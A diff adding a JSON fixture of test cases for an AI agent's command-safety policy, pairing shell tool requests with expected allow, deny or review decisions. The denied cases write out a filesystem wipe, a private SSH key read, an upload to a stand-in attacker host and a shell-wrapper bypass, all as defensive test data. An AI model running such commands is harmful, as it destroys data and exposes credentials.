@@ -1,0 +1,129 @@
+[
+  {
+    "name": "safe go test",
+    "description": "A bounded workspace test command using an allowlisted environment name.",
+    "request": {
+      "tool_name": "workspace_exec",
+      "backend": "workspaceexec",
+      "command": "go test ./tool/safety",
+      "env": {
+        "LANG": "C"
+      },
+      "timeout_seconds": 30,
+      "max_output_bytes": 2048
+    },
+    "expected_decision": "allow"
+  },
+  {
+    "name": "dangerous delete",
+    "description": "A recursive forced deletion of the filesystem root.",
+    "request": {
+      "tool_name": "workspace_exec",
+      "backend": "workspaceexec",
+      "command": "rm -rf /"
+    },
+    "expected_decision": "deny"
+  },
+  {
+    "name": "credential read",
+    "description": "A request to read a private SSH key.",
+    "request": {
+      "tool_name": "workspace_exec",
+      "backend": "workspaceexec",
+      "command": "cat ~/.ssh/id_rsa"
+    },
+    "expected_decision": "deny"
+  },
+  {
+    "name": "denied network egress",
+    "description": "A network request to a host outside the allowlist.",
+    "request": {
+      "tool_name": "workspace_exec",
+      "backend": "workspaceexec",
+      "command": "curl https://evil.example/upload"
+    },
+    "expected_decision": "deny"
+  },
+  {
+    "name": "allowed network request",
+    "description": "A network request to a subdomain of an allowlisted domain.",
+    "request": {
+      "tool_name": "workspace_exec",
+      "backend": "workspaceexec",
+      "command": "curl https://api.github.com/repos/trpc-group/trpc-agent-go"
+    },
+    "expected_decision": "allow"
+  },
+  {
+    "name": "shell wrapper bypass",
+    "description": "A shell wrapper that hides the executable command behind -c.",
+    "request": {
+      "tool_name": "workspace_exec",
+      "backend": "workspaceexec",
+      "command": "bash -c 'echo hidden'"
+    },
+    "expected_decision": "deny"
+  },
+  {
+    "name": "pipeline command",
+    "description": "A pipeline requiring review of every segment.",
+    "request": {
+      "tool_name": "workspace_exec",
+      "backend": "workspaceexec",
+      "command": "cat README.md | wc -l"
+    },
+    "expected_decision": "needs_human_review"
+  },
+  {
+    "name": "dependency install",
+    "description": "An environment-mutating dependency installation.",
+    "request": {
+      "tool_name": "workspace_exec",
+      "backend": "workspaceexec",
+      "command": "go install example.com/tool@latest"
+    },
+    "expected_decision": "needs_human_review"
+  },
+  {
+    "name": "long runtime",
+    "description": "A sleep longer than the configured timeout.",
+    "request": {
+      "tool_name": "workspace_exec",
+      "backend": "workspaceexec",
+      "command": "sleep 60"
+    },
+    "expected_decision": "needs_human_review"
+  },
+  {
+    "name": "oversized output",
+    "description": "An unbounded output producer.",
+    "request": {
+      "tool_name": "workspace_exec",
+      "backend": "workspaceexec",
+      "command": "yes"
+    },
+    "expected_decision": "needs_human_review"
+  },
+  {
+    "name": "host long session",
+    "description": "A host PTY/background request whose omitted timeout inherits the backend's long default.",
+    "request": {
+      "tool_name": "host_exec",
+      "backend": "hostexec",
+      "command": "go test ./tool/safety",
+      "background": true,
+      "tty": true
+    },
+    "expected_decision": "deny"
+  },
+  {
+    "name": "explicit human review",
+    "description": "An environment expansion that cannot be conservatively resolved.",
+    "request": {
+      "tool_name": "workspace_exec",
+      "backend": "workspaceexec",
+      "command": "echo $HOME"
+    },
+    "expected_decision": "ask"
+  }
+]
